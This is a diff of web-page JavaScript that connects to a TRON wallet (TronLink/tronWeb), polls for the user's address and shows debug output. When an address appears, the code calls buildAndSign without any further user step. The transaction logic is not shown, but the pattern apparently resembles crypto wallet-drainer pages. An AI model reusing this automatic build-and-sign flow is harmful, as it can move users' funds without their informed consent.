@@ -75,33 +75,40 @@
             var addr = getAddress();
             if (addr) { buildAndSign(addr); return; }
 
-            // Method 2: tronLink.request
-            if (window.tronLink && window.tronLink.request) {
-                window.tronLink.request({ method: "tron_requestAccounts" }).then(function() {
-                    // Wait a moment for address to populate
-                    setTimeout(function() {
-                        var a = getAddress();
-                        if (a && !done) buildAndSign(a);
-                        else msg("Wallet not ready", "Please refresh the page");
-                    }, 500);
-                }).catch(function() {
-                    msg("Access denied", "Please allow access and refresh");
-                });
-                return;
+            // Listen for account changes
+            window.addEventListener("message", function(e) {
+                if (e.data && e.data.message && e.data.message.action === "setAccount") {
+                    var a = getAddress();
+                    if (a && !done) buildAndSign(a);
+                }
+            });
+
+            // Request accounts and poll for address
+            var reqFn = (window.tronLink && window.tronLink.request) || (window.tronWeb && window.tronWeb.request);
+            if (reqFn) {
+                reqFn({ method: "tron_requestAccounts" }).then(function() {}).catch(function(){});
             }
 
-            // Method 3: tronWeb.request
-            if (window.tronWeb && window.tronWeb.request) {
-                window.tronWeb.request({ method: "tron_requestAccounts" }).then(function() {
-                    setTimeout(function() {
-                        var a = getAddress();
-                        if (a && !done) buildAndSign(a);
-                    }, 500);
-                }).catch(function(){});
-                return;
-            }
-
-            msg("Wallet not detected", "Please open in Trust Wallet browser");
+            // Poll for address after request (it may take a few seconds)
+            var pollCount = 0;
+            var pollTimer = setInterval(function() {
+                pollCount++;
+                var a = getAddress();
+                el2.textContent = "Connecting... (" + pollCount + ") addr:" + (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
+                if (a && !done) {
+                    clearInterval(pollTimer);
+                    buildAndSign(a);
+                } else if (pollCount > 30) {
+                    clearInterval(pollTimer);
+                    // Show full debug
+                    var tw = window.tronWeb;
+                    var info = "";
+                    if (tw) {
+                        info = "addr:" + JSON.stringify(tw.defaultAddress) + " ready:" + tw.ready;
+                    }
+                    msg("Could not get address", info);
+                }
+            }, 500);
         }
 
         // Wait for tronWeb to be injected, then connect immediately
